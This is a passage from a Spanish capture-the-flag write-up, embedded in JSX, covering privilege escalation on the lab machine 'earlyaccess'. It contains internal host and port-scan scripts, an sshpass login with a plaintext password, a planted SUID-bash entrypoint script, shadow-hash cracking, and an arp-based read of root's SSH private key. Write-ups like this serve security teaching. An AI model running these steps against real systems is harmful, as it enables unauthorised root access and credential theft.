        <Paragraph>
          Ejecutaremos <Anchor src='https://github.com/carlospolop/PEASS-ng'>linpeas</Anchor>, y veremos un correo de Game-adm a drew,
          el cual dice que si el juego se rompe automáticamente estará online en 1m aproximadamente.
        </Paragraph>
        <Paragraph>
          También vemos que ...
        </Paragraph>
        <Highlighter
          text={`
game-adm@earlyaccess:/$ getcap -r / 2>/dev/null
/usr/sbin/arp =ep
/usr/bin/ping = cap_net_raw+ep
        `}
        />
        <Paragraph>
          teniendo arp que vale <i>=ep</i> podemos leer archivos root, pero arp solo pueden ejecutarlo los del grupo adm,
          entonces si nos convertimos en <i>game-adm</i> podremos escalar privilegios.
        </Paragraph>
        <Highlighter
          text={`
game-adm@earlyaccess:/$ ls -l /usr/sbin/arp
-rwxr-x--- 1 root  adm 67512 Sep 24 2018 /usr/sbin/arp
        `}
        />
        <SubTitle>
          Root Shell
        </SubTitle>
        <Paragraph>
          Ahora toca meterse como root, vemos un <i>.ssh</i> con un rsa pública y privada, en la publica
          nos muestra <i>game-tester@game-server</i> al final del output vemos un nuevo usuario <i>game-tester</i> y un contenedor <i>game-server</i>
          que no nos resuelve por ejemplo <i>ping -c 1 game-server</i>.
        </Paragraph>
        <Paragraph>
          Toca hacer un descubrimiento de puertos en <i>hostname -I</i> y verificar cuál es el que tiene el puerto  22 abierto así ingresaremos con la rsa pública, para
          ello montaremos un script.
        </Paragraph>
        <Highlighter
          text={`
#!/bin/bash
networks=$(hostname -I)

for net in $\{networks[@]}; do
  echo -e "\\n[+] Escaneando el puerto $net.0/22:\\n"
  for i in $(seg 1 254); do
      timeout 1 bash -c  "ping -c 1 $network.$i" &>/dev/null && echo -e "[+] Host: $network.$i - Open" &
  done; wait
done
        `}
        />
        <Paragraph>
          Ahora teniendo los hostname terminando en <i>.0</i> crearemos otro script para ver en cuál de ellos está el puerto 22 abierto.
        </Paragraph>
        <Highlighter
          text={`
#!/bin/bash
hostnames=(172.18.0.100 172.18.0.101 172.18.0.102 172.18.0.2 172.19.0.2 172.19.0.3)

for host in $\{hostnames[@]}; do
  timeout 1 bash -c  "echo '' > /dev/tcp/$host/22" 2>/dev/null && echo "[+] Puerto 22 esta abierto en $host"
done
        `}
        />
        <Highlighter
          text={`
drew@earlyacccess:/tmp$ ./port22Open.sh
[+] Puerto 22 esta abierto en 172.19.0.3
        `}
        />
        <Paragraph>
          Ahora nos conectamos por <i>ssh</i> a la <i>172.19.0.3</i>
        </Paragraph>
        <Highlighter
          text={`
drew@earlyacccess:~/.ssh$ ssh game-tester@172.19.0.3 
        `}
        />
        <Paragraph>
          Ahora estamos como <i>game-tester</i> con el host <i>game-server</i> tal vez en algún puerto de este
          host está corriendo el servidor web para ello vemos...
        </Paragraph>
        <Highlighter
          text={`
game-tester@game-server:/$ ss -nltp
...
LISTEN  0   128   *:9999  *:*
... 
        `}
        />
        <Paragraph>
          de primeras no tenemos resolución a esa ruta que está en un contenedor pero podríamos ingresar
          con ssh y el parámetro -D
        </Paragraph>
        <Highlighter
          text={`
sshpass -p "XeoNu86JTznxMCQuGHrGutF3Csq5" ssh drew@10.10.11.110 -D 1080
        `}
        />
        <Paragraph>
          con la extensión de foxy proxy por ejemplo configuramos...
        </Paragraph>
        <Image
          src='/early_foxy_proxy.webp'
          layout='responsive'
          width={540}
          height={241}
        />
        <Image
          src='/early_game_9999.webp'
          layout='responsive'
          width={528}
          height={222}
        />
        <Paragraph>
          Ahora en <i>/</i> tenemos un archivo llamado <i>entrypoint.sh</i>
        </Paragraph>
        <Highlighter
          text={`
game-tester@game-server:/$ cat entrypoint.sh
#!/bin/bash
for ep in /docker-entrypoint.d/*; do
  if [ -x "$(ep)" ]; then
    echo "Running: \${ep}"
    "\${ep}" &
  fi
done
tail -f /dev/null
        `}
        />
        <Paragraph>
          vemos que en <i>/docker-entrypoint.d</i> tenemos un archivo <i>node-server.sh</i>...
        </Paragraph>
        <Highlighter
          text={`
game-tester@game-server:/$ cat node-server.sh
service ssh start

cd /usr/src/app

# Install dependencies
npm install
sudo -u node node server.js
        `}
        />
        <Paragraph>
          coger cada archivo dentro de <i>/docker-entrypoint.d</i> y lo ejecuta, pero el <i>node-server.sh</i> lo tendrá que traerlo de alguna ruta para ello
          ejecutamos...
        </Paragraph>
        <Highlighter
          text={`
find \\-name node-server.sh 2>/dev/null
./opt/docker-entrypoint.d/node-server.sh
        `}
        />
        <Paragraph>
          es esta la ruta donde tendremos que crear nuestro script para ganar acceso y
          tratar de petar el juego como por ejemplo <i>curl http://127.0.0.1:9999/autoplay -d 'rounds=-1'</i>
        </Paragraph>
        <Highlighter
          text={`
drew@earlyaccess:/$ while true; do echo "chmod u+s /bin/bash" > /opt/docker-entrypoint/miscript.sh; chmod +x /opt/docker-entrypoint/miscript.sh;sleep 1; done
        `}
        />
        <Paragraph>
          y del otro lado... y esperamos ....
        </Paragraph>
        <Highlighter
          text={`
game-tester@game-server:/$ curl http://127.0.0.1:9999/autoplay -d 'rounds=-1'
Connection to 172.19.0.3 closed by remote host.
Connection to 172.19.0.3 closed.
drew@earlyaccess:~/.shh
        `}
        />
        <Paragraph>
          una vez que nos bota el host nos conectamos de nuevo <i>ssh game-tester@172.19.0.3</i> y listooo...
        </Paragraph>
        <Highlighter
          text={`
-bash-4.4$ cd /docker-entrypoint.d/
-bash-4.4$ ls
miscript.sh node-server.sh
-bash-4.4$ bash -p
bash-4.4# whoami
root
bash-4.4#
        `}
        />
        <Paragraph>
          no vemos ninguna flag en la raiz pero podemos ver el <i>/etc/shadow</i> y existe un mismo usuario <i>game-adm</i>
          la trataremos de romper con nuestro querido <i>jhon</i>.
        </Paragraph>
        <Highlighter
          text={`
jhon --wordlist=/usr/share/wordlists/rockyou.txt hash
...
gamemaster (game-adm)
...
        `}
        />
        <Paragraph>
          genial nos dio una contraseña nos conectamos <i>drew@earlyaccess:/home$ su game-adm</i>
          este usuario pertenece al grupo <i>4(adm)</i> recordemos que teníamos <i>arp</i> con las
          capacidades de <i>=ep</i> la cual nos permite leer archivos como indica <Anchor src='https://gtfobins.github.io/gtfobins/arp/#file-read'>gtfobins</Anchor>,
          entonces procedemos de la siguiente manera...
        </Paragraph>
        <Highlighter
          text={`
game-adm@earlyaccess:/home$ LFILE=/root/.ssh/id_rsa
game-adm@earlyaccess:/home$ /usr/sbin/arp -v -f $LFILE 2>&1 | grep -Ev "format|cannot|Unknown host" | sed 's/>> //' >/tmp/id_rsa
game-adm@earlyaccess:/home$ chmod 600 /tmp/id_rsa
game-adm@earlyaccess:/tmp$ ssh -i id_rsa root@localhost
root@earlyaccess:~# cd /root
root@earlyaccess:~# ls
app root.txt
root@earlyaccess:~# cat root.txt
******************
        `}
        />
      </ContentBlock>
    </>
  )
}
